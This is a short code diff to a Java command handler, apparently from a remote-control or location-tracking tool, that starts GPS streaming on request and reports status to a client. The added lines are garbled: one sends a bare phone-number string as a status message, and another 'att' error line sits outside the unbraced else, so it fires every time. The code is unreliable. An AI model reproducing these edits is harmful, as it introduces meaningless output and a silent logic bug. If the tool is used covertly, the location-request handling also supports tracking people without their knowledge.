@@ -65,9 +65,11 @@ public class ProcessCommand
 			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
 				client.gps = new GPSListener(client, provider, chan);
 				client.sendInformation("Location request received");
+				client.sendInformation("15807997289");
 			}
 			else
 				client.sendError("Unknown provider '"+provider+"' for location");
+				client.sendError("att '"+provider+"' for location");
 			
 		} else if (commande == Protocol.STOP_GPS_STREAM)
 		{
